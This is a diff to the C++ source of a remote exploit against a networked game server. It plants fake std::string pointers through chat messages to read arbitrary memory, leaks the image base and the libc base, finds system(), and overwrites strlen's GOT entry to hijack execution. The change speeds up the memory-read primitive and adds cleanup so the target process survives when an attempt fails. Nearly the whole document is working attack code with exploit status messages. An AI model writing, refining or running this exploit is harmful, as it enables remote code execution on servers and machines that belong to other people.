@@ -646,31 +646,89 @@ static ReadResult harvestFull(Cli &R, int k)
 // full-info relay, and the server serializes 8 bytes read from `target` straight to the reader.
 // Written byte-wise: the chat write is strlen-truncated, so a target containing an internal NUL
 // would silently truncate a single 6-byte write.
+// Shadow of every fake std::string this run has planted, so a read only has to write the bytes
+// that actually CHANGED.
+//
+// The old aread re-wrote the whole 16-byte object every time: six bytes of _M_p, the high-byte
+// terminator, the length, and six capacity bytes, then undid all of it afterwards. Twenty-two
+// byte-writes at 240 ms each, around 5.3 s of the roughly 7 s a single read cost, to re-state
+// values that were already correct. Consecutive reads differ only in the low byte or two of _M_p:
+// walking a program header table steps 56 bytes at a time, and a hash chain steps 4. So keep what
+// was planted and write the delta.
+//
+// The restore also moves out of the read and into teardown. It exists so a Player destructor never
+// frees a wild pointer at disconnect, which is a per-RUN obligation, not a per-read one.
+struct Plant { bool live = false, hdr = false; uint64_t ptr = 0; };
+static Plant g_plant[19];
+
+// Restore every planted slot to its own SSO buffer. Called on the failure paths, where the process
+// is expected to keep running: main() used to return 3 from several points AFTER aiming a string at
+// an arbitrary address, leaving a Player whose destructor frees a wild pointer at disconnect.
+static void restorePlants(Cli &A, uint64_t eq)
+{
+    for (int k = 0; k < 19; k++) {
+        if (!g_plant[k].live) continue;
+        uint64_t eqk = eq + P.item_stride * k, sso = eqk + 16;
+        for (int i = 0; i < 6; i++) {
+            unsigned char b = (unsigned char)((sso >> (8 * i)) & 0xff);
+            redirect(A, eqk + i);
+            if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
+        }
+        redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
+        { unsigned char z = 0; redirect(A, eqk + 8); sendChatBytes(A, &z, 1); }
+        g_plant[k] = Plant{};
+        vlog("[restored slot %d]\n", k);
+    }
+}
+
 static ReadResult aread(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const char *cell)
 {
     uint64_t eqk = eq + P.item_stride * k;
-    for (int i = 0; i < 6; i++) {
-        unsigned char b = (unsigned char)((tgt >> (8 * i)) & 0xff);
-        redirect(A, eqk + i);
-        if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
+    Plant &pl = g_plant[k];
+    int pkts = 0;
+
+    // Length and capacity are identical on every read through this slot, so write them once.
+    if (!pl.hdr) {
+        { unsigned char e = 8; redirect(A, eqk + 8); sendChatBytes(A, &e, 1); }  // _M_string_length = 8
+        for (int z = 10; z < 16; z++) { redirect(A, eqk + z); sendChatBytes(A, (const void *)"", 0); }
+        pl.hdr = true; pkts += 7;
     }
-    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
-    { unsigned char e = 8; redirect(A, eqk + 8); sendChatBytes(A, &e, 1); }
-    for (int z = 10; z < 16; z++) { redirect(A, eqk + z); sendChatBytes(A, (const void *)"", 0); }
+
+    // Plant _M_p as maximal NUL-free RUNS, one packet each, instead of one packet per byte.
+    //
+    // Byte-at-a-time was not paranoia: the write is `chatMessage = rstr.C_String()`, which is
+    // strlen-bounded, so a single six-byte write of a pointer containing an internal zero would be
+    // silently truncated. But that only forces a split AT the zero bytes, not everywhere. A typical
+    // heap or image pointer here is six non-zero bytes, so it goes in ONE packet rather than six.
+    //
+    // The subtlety that makes a naive "only write what changed" optimisation WRONG, and which cost
+    // a debugging cycle to find: operator=(const char*) writes strlen(s) bytes AND a terminating
+    // NUL, so writing byte i also zeroes byte i+1. Skipping an unchanged byte i+1 after writing
+    // byte i therefore corrupts the pointer. Writing whole runs is both faster and immune to that,
+    // because each run rewrites everything after the previous run's terminator.
+    {
+        unsigned char pb[6];
+        for (int i = 0; i < 6; i++) pb[i] = (unsigned char)((tgt >> (8 * i)) & 0xff);
+        int i = 0;
+        while (i < 6) {
+            if (!pb[i]) {                       // a zero byte: an empty write leaves just the NUL
+                redirect(A, eqk + i); sendChatBytes(A, (const void *)"", 0); pkts++;
+                i++; continue;
+            }
+            int j = i; while (j < 6 && pb[j]) j++;   // maximal non-zero run [i, j)
+            redirect(A, eqk + i); sendChatBytes(A, pb + i, (size_t)(j - i)); pkts++;
+            i = j;                              // byte j was zeroed by that write's terminator
+        }
+        // Byte 6 must be 0. The last run's terminator already did it when the run reached byte 5.
+        if (pb[5] == 0) { redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0); pkts++; }
+    }
+    pl.ptr = tgt; pl.live = true;
+    vlog("[read %#llx via slot %d: %d packets]\n", (unsigned long long)tgt, k, pkts);
+
     for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
     drainboth(A, R, 1200);          // RELIABLE_ORDERED only orders within one channel; let the plant land first
     cellChange(A, cell);
-    ReadResult r = harvestFull(R, k);
-    // restore _M_p to the string's own SSO buffer so no destructor frees a wild pointer
-    { uint64_t sso = eqk + 16;
-      for (int i = 0; i < 6; i++) {
-          unsigned char b = (unsigned char)((sso >> (8 * i)) & 0xff);
-          redirect(A, eqk + i);
-          if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
-      } }
-    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
-    { unsigned char z = 0; redirect(A, eqk + 8); sendChatBytes(A, &z, 1); }
-    return r;
+    return harvestFull(R, k);
 }
 
 static ReadResult RD(Cli &A, Cli &R, uint64_t eq, uint64_t addr, const char *cell) { return aread(A, R, eq, 7, addr, cell); }
@@ -909,7 +967,10 @@ int main(int argc, char **argv)
     sendChatStr(A, std::string(400, 'Z')); drainboth(A, R, 200);   // prime chatMessage (heap buffer, capacity >= 400)
     uint64_t v = aread(A, R, eq, 7, base - 8, cell).val;
     uint64_t pie = v > 0x100000000ULL ? v - P.vtable_rva : 0;
-    if (!pie || (pie & 0xfff)) { printf("[!] image base leak failed (read %#llx)\n", (unsigned long long)v); return 3; }
+    if (!pie || (pie & 0xfff)) {
+        printf("[!] image base leak failed (read %#llx)\n", (unsigned long long)v);
+        restorePlants(A, eq); return 3;
+    }
     printf("[+] image base           %#llx  (page aligned)\n", (unsigned long long)pie);
 
     // 5. libc base + system(). The base is derived remotely and file-free: mask &malloc down to a load
@@ -923,7 +984,10 @@ int main(int argc, char **argv)
     uint64_t libc = 0, mp = 0;
     if (mGiven) { mp = aread(A, R, eq, 7, pie + P.malloc_got, cell).val; libc = mp > 0x100000000ULL ? mp - P.malloc_off : 0; }
     else        { libc = remoteLibcBase(A, R, eq, cell, pie, mp); }
-    if (!libc || (libc & 0xfff)) { printf("[!] libc base resolution failed (&malloc=%#llx). Try --malloc-off/--libc.\n", (unsigned long long)mp); return 3; }
+    if (!libc || (libc & 0xfff)) {
+        printf("[!] libc base resolution failed (&malloc=%#llx). Try --malloc-off/--libc.\n", (unsigned long long)mp);
+        restorePlants(A, eq); return 3;
+    }
     uint64_t moff = mp - libc;
     printf("[+] libc base            %#llx  (page aligned; malloc offset %#llx)\n", (unsigned long long)libc, (unsigned long long)moff);
     // system offset: explicit override, then --libc file, then the build table keyed by the malloc offset.
@@ -935,7 +999,7 @@ int main(int argc, char **argv)
         printf("[!] glibc build not recognized (malloc offset %#llx).\n", (unsigned long long)moff);
         printf("    Supply system's offset: --system-off <hex>, or --libc <the matching public libc.so.6>.\n");
         printf("    It is public per-distro data (e.g. the Ubuntu libc6 package), not anything off the target.\n");
-        return 3;
+        restorePlants(A, eq); return 3;
     }
     uint64_t sys = libc + soff;
     printf("[+] system()             %#llx  (%s)\n", (unsigned long long)sys, ssrc);
@@ -943,6 +1007,9 @@ int main(int argc, char **argv)
 
     // 6. aim eq[7].refId at strlen@got. capacity must exceed the value we are about to assign,
     //    or _M_replace takes the reallocating path and free()s the GOT address itself.
+    // From here the plant is deliberate and must NOT be restored: it is the weapon. Drop it from the
+    // shadow so nothing later tries to undo it.
+    g_plant[7] = Plant{};
     uint64_t eqk = eq + P.item_stride * 7;
     for (int i = 0; i < 6; i++) {
         unsigned char b = (unsigned char)((sgot >> (8 * i)) & 0xff);
